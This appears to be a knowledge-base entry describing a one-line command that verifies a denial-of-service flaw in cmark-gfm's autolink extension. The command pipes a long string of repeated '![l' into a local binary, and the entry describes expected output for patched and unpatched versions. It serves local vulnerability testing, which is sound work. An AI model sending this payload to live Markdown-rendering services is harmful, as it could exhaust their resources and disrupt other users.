---
data: 'python3 -c ''print("![l"* 100000 + "\n")'' | ./cmark-gfm -e autolink'
tags:
  - dos
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.261Z'
id: 4b6d1ae5-e713-4e6f-9338-f8f81fb7f1a3
verified: false
validated: true
submitted: true
---
# verify-cmark-gfm-dos

## Command

```bash
python3 -c 'print("![l"* 100000 + "\n")' | ./cmark-gfm -e autolink
```

## Description

Pipes a malicious payload into the cmark-gfm binary to test for resource exhaustion in the autolink extension on unpatched versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c` | Python code execution flag | Yes |
| `* 100000` | Repetition count for '![l' | Yes |
| `+ "\n"` | Newline append | Yes |
| `./cmark-gfm` | Path to cmark-gfm binary | Yes |
| `-e autolink` | Enable autolink extension | Yes |

## Examples

### Basic Usage

```bash
python3 -c 'print("![l"* 100000 + "\n")' | ./cmark-gfm -e autolink
```

### Advanced Usage

```bash
python3 -c 'print("![l"* 100000 + "\n")' | timeout 10s ./cmark-gfm -e autolink  # With timeout
```

## Expected Output

On unpatched: Process hangs or high resource use (monitor with top); partial or no output. On patched: Immediate empty or minimal HTML output.

## Related

- [[commands/generate-cmark-gfm-dos-payload]]
- [[procedures/Verify-Vulnerability-in-cmark-gfm-Locally]]
